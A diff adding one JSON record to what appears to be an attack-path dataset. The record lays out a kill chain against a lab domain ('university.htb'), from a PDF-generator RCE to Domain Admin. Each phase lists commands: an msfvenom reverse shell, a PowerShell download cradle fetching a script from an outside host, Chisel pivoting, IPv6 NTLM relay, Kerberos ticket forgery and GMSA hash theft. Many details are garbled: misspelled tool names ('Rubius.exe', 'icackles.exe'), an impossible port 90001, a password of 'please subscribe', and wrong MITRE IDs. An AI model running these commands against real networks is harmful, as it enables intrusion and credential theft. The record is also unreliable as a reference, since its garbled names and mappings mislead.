@@ -1,0 +1,185 @@
+{
+  "id": "ap-0035",
+  "title": "RCE to Domain Admin via Unconstrained Delegation and NTLM Relay (IPv6)",
+  "summary": "The attack exploits an RCE vulnerability in a PDF generator to achieve initial access, pivots internally using Chisel, leverages credentials to gain root on a Linux host (Lab 2), and utilizes the Linux host to perform an NTLM Relay attack over IPv6 against a high-value Windows host (WS3) with Unconstrained Delegation, ultimately leading to the theft of GMSA credentials and Domain Administrator impersonation.",
+  "attack_path_markdown": "### Step 1: Initial RCE\nExploit ReportLab XHTML to PDF RCE vulnerability via the profile export feature to execute a PowerShell reverse shell.\n### Step 2: Internal Access & Recon\nEstablish stable access via Evil-WinRM, retrieve credentials for user WAO, and use Chisel to proxy into the internal subnet (192.168.99.x). Run RustHound to discover the domain structure, identifying WS3 (Unconstrained Delegation) and Lab 2 (Linux pivot).\n### Step 3: NTLM Relay Setup\nLog into Lab 2 as WAO, escalate to root (`sudo su`), and configure the NTLM Relay attack using `mitm6.py` and `ntlmrelayx.py` targeting LDAP on the DC, forcing WS3 to authenticate over IPv6.\n### Step 4: Delegation and Credential Theft\nUpon successful relay, a fabricated machine account (`IPSAC$`) gains delegation rights to WS3. Use `getST.py` to forge a Kerberos ticket for Administrator on WS3. Log in, run `Rubius.exe` to steal a TGT (Rose L), which is then used to read the GMSA client NTLM hash.\n### Step 5: Domain Administrator\nUse the GMSA NTLM hash and `getST.py` to forge the final service ticket allowing impersonation of Administrator on the DC.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Initial network mapping and identification of the Active Directory domain and target operating system details.",
+      "actions": [
+        "Scan the target IP address",
+        "Determine the AD domain and DC hostname",
+        "Analyze TTL to confirm Windows OS",
+        "Identify the web service technology (Django/Engine X)"
+      ],
+      "tools": ["nmap", "net exec", "curl", "sudo v /etc/hosts", "tcpdump"],
+      "techniques": ["Network Scanning (T1046)", "Domain Enumeration (T1590)"],
+      "mitre_ids": ["T1046", "T1590"],
+      "indicators": ["DNS banner 'simple DNS plus'", "LDAP domain 'university.htb'", "TTL of 127/128 (Windows)"],
+      "preconditions": "External network connectivity to 10.10.1.39",
+      "expected_outcome": "List of open ports (53, 80, 88, 135, 139, 389, 445, 5985) and confirmed AD domain structure.",
+      "confidence": 1.0,
+      "commands": [
+        "nmap -sC -sV -VV -oA university 10.10.1.39",
+        "net exec SMB 10.10.1.39",
+        "sudo v /etc/hosts (adding 10.10.1.39 entries for university.htb, DC, DC.university.htb)",
+        "sudo tcpdump -I tun0 -v (to inspect TTLs)"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of the Remote Code Execution payload leveraging the XHTML to PDF generation vulnerability.",
+      "actions": [
+        "Identify the ReportLab RCE vulnerability (ReportLab rce from 2023, xhtml2pdf)",
+        "Craft malicious HTML payload designed for RCE"
+      ],
+      "tools": ["Python 3 http.server", "Nang shells", "msfvenom"],
+      "techniques": ["Exploit Payload Creation (T1027)"],
+      "mitre_ids": ["T1027"],
+      "indicators": ["Proof of concept HTML/XML structure for RCE"],
+      "preconditions": "Knowledge of the target environment (Windows) and available exploit",
+      "expected_outcome": "Encoded PowerShell command ready to be injected.",
+      "confidence": 1.0,
+      "commands": [
+        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.99.12 LPORT=90001 -f exe -o rev.exe (for later use)",
+        "cmd /c powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.1.48:8000/shell.ps1')\" (PowerShell download cradle)",
+        "echo <HTML RCE Payload> | iconv -t UTF-16LE | base64 -w 0 (for PowerShell encoding)"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Injection of the malicious payload into the web application via the profile export feature.",
+      "actions": [
+        "Register and log in as a student",
+        "Input the malicious HTML into the profile's rich text editor",
+        "Trigger the PDF generation/export function"
+      ],
+      "tools": ["Web browser interface"],
+      "techniques": ["Exploit Public-Facing Application (T1190)"],
+      "mitre_ids": ["T1190"],
+      "indicators": ["HTTP POST request containing the malicious HTML/XML"],
+      "preconditions": "Active student account",
+      "expected_outcome": "The server attempts to process the malicious HTML input.",
+      "confidence": 0.95,
+      "commands": []
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Executing the RCE payload to gain initial access and a reverse shell.",
+      "actions": [
+        "Listen for the incoming connection",
+        "Execute the encoded PowerShell command via the RCE vulnerability"
+      ],
+      "tools": ["nc", "PowerShell"],
+      "techniques": ["Remote Code Execution (T1213)", "Reverse Shell"],
+      "mitre_ids": ["T1213"],
+      "indicators": ["Successful ICMP pings from the target (10.10.1.39)", "Reverse shell connection"],
+      "preconditions": "Successful payload delivery (Phase 3)",
+      "expected_outcome": "Initial low-privileged shell on the web server (user `WAO` environment).",
+      "confidence": 0.95,
+      "commands": [
+        "nc -lvnp 90001 (listening for shell)",
+        "TCP dump filter for ICMP (initial verification): sudo tcpdump -I tun0 -n icmp"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establishing a stable C2 channel (Evil WinRM) and internal pivoting mechanism (Chisel SOCKS proxy).",
+      "actions": [
+        "Extract WAO credentials from `db_backups` PowerShell script",
+        "Establish WinRM session using WAO credentials",
+        "Set up SMB share and transfer Chisel binary to the target",
+        "Start Chisel server on attack machine and client on target machine to proxy internal subnet access"
+      ],
+      "tools": ["smbserver.py (Impacket)", "Evil-WinRM", "Chisel.exe"],
+      "techniques": ["Account Discovery (T1087)", "C2 Establishment (T1071.001)", "Internal Proxy (T1090)"],
+      "mitre_ids": ["T1087", "T1090"],
+      "indicators": ["Successful Evil WinRM login", "Chisel proxy operational"],
+      "preconditions": "Initial shell access and WAO credentials",
+      "expected_outcome": "Stable session and access to the 192.168.99.x internal network segment.",
+      "confidence": 1.0,
+      "commands": [
+        "type \\db_backups\\backup_script.ps1 (to view WAO password)",
+        "sudo smbserver.py share . -username ipsac -password ipsac (running with SMB2 support implied)",
+        "Evil-WinRM -i 10.10.1.39 -u WAO -p <password>",
+        "copy \\\\10.10.1.48\\share\\chisel.exe C:\\ProgramData\\chis.exe (SMB transfer)",
+        "chisel server -p 8001 --reverse (on attack box)",
+        "C:\\ProgramData\\chis.exe client 10.10.1.48 8001 R:socks"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Detailed AD enumeration and lateral movement to the key pivot host (Lab 2) and high-value target identification (WS3).",
+      "actions": [
+        "Execute RustHound for AD mapping",
+        "Identify WS3 (Unconstrained Delegation) and Lab 2 (Linux host) on the internal network",
+        "SSH to Lab 2 and elevate privileges to root",
+        "Force WS3 to authenticate via a malicious shortcut/lecture upload (optional, but used for expediting the attack)"
+      ],
+      "tools": ["RustHound", "BloodHound", "proxychains", "ssh", "sudo", "GPG", "openssl", "icackles.exe"],
+      "techniques": ["AD Discovery (T1482)", "Lateral Movement (T1558)", "Privilege Escalation (Linux)"],
+      "mitre_ids": ["T1482", "T1558"],
+      "indicators": ["BloodHound path highlighting WS3 delegation", "Root access on Lab 2"],
+      "preconditions": "WAO credentials and internal proxy access",
+      "expected_outcome": "Staging host (Lab 2/root) ready for NTLM Relay against WS3.",
+      "confidence": 1.0,
+      "commands": [
+        "RustHound domain university.htb user wao password <password>",
+        "proxychains ssh wao@192.168.99.12",
+        "sudo su (on Lab 2)",
+        "openssl req -new -key nia.key -out nia.csr (and related commands for certificate signing)",
+        "openssl x509 -req -in nia.csr -CA rootCA.crt -CAkey rootCA.key -out nia.pem",
+        "icackles.exe rev.exe /grant everyone:F (to allow execution of the reverse shell uploaded to WS3 ProgramData)"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Execution of the NTLM Relay attack via IPv6, gaining delegation rights, TGT theft, and final Domain Admin impersonation.",
+      "actions": [
+        "Create a temporary machine account for relay purposes",
+        "Run MITM6 and NTLM Relay targeting LDAP",
+        "Force WS3 to authenticate (e.g., via Windows Update checks)",
+        "Forge an Administrator Kerberos ticket for WS3 using delegation rights",
+        "Use Rubius to steal Rose L's TGT (Account Operators member)",
+        "Use Rose L's TGT to retrieve the GMSA client NTLM hash",
+        "Forge the final Administrator service ticket to the DC using the GMSA hash"
+      ],
+      "tools": ["addcomputer.py", "mitm6.py", "ntlmrelayx.py", "getST.py", "Rubius.exe", "ticketConverter", "nxc (NetExec)"],
+      "techniques": ["NTLM Relay via IPv6 (T1550.002)", "Unconstrained Delegation Abuse (T1558.002)", "Kerberos Ticket Forgery (T1558.003)", "GMSA Password Retrieval"],
+      "mitre_ids": ["T1550.002", "T1558.002", "T1558.003"],
+      "indicators": ["IPSAC$ granted delegation rights", "Rose L's TGT captured", "DC Administrator shell established"],
+      "preconditions": "Root access on Lab 2 and successful WS3 authentication trigger.",
+      "expected_outcome": "Domain Administrator access on DC.",
+      "confidence": 0.9,
+      "commands": [
+        "addcomputer.py IPSAC$ -computer-pass  university.htb/wao:<password> -dc-host DC.university.htb",
+        "sudo python3 MITM6.py -d university.htb -i eth0",
+        "ntlmrelayx.py -6 -t ldap://192.168.99.1 --delegate-access --escalate-user IPSAC$ --wpad-host WS3",
+        "getST.py -spn http/ws3.university.htb university.htb/IPSAC$:please subscribe -impersonate administrator -dc-ip 10.10.1.39",
+        "proxychains evil-winrm -i ws3.university.htb -r university.htb (using ccache from getST.py)",
+        "Rubius.exe monitor --no-wrap (on WS3)",
+        "echo <Rose L TGT kirbi base64> | base64 -d > rose_l.kirbi",
+        "ticketConverter rose_l.kirbi rose_l.ccache",
+        "KRB5CCNAME=rose_l.ccache nxc ldap university.htb -k GMSA (to get NTLM hash)",
+        "getST.py -spn http/DC.university.htb -hashes :<GMSA_NTLM_Hash> university.htb/GMSAPclient01$ -impersonate administrator",
+        "KRB5CCNAME=administrator_dc_ccache evil-winrm -i DC.university.htb -r university.htb"
+      ]
+    }
+  ],
+  "tactics": ["Initial Access", "Discovery", "Lateral Movement", "Privilege Escalation", "Credential Access", "Defense Evasion"],
+  "techniques": ["Exploit Public-Facing Application", "NTLM Relay", "Unconstrained Delegation Abuse", "GMSA Credential Theft", "Kerberos Ticket Forgery"],
+  "mitre_ids": ["T1190", "T1550.002", "T1558.002", "T1558.003", "T1078"],
+  "hosts": ["university.htb", "DC.university.htb", "WS3", "Lab 2"],
+  "privs_obtained": ["domain user (WAO)", "root (Lab 2)", "administrator (WS3)", "domain administrator (DC)"],
+  "confidence": 0.9,
+  "notes": "Significant difficulty encountered transferring and stabilizing the Chisel proxy due to Defender interference or networking issues. The NTLM Relay relies on IPv6 link-local traffic (WPAD) and the ability to force authentication via Windows settings/updates or an interactive user clicking a shortcut.",
+  "labels": ["attack_path", "ntlm_relay_v6", "kerberos", "delegation_abuse", "windows_ad", "rce"]
+}
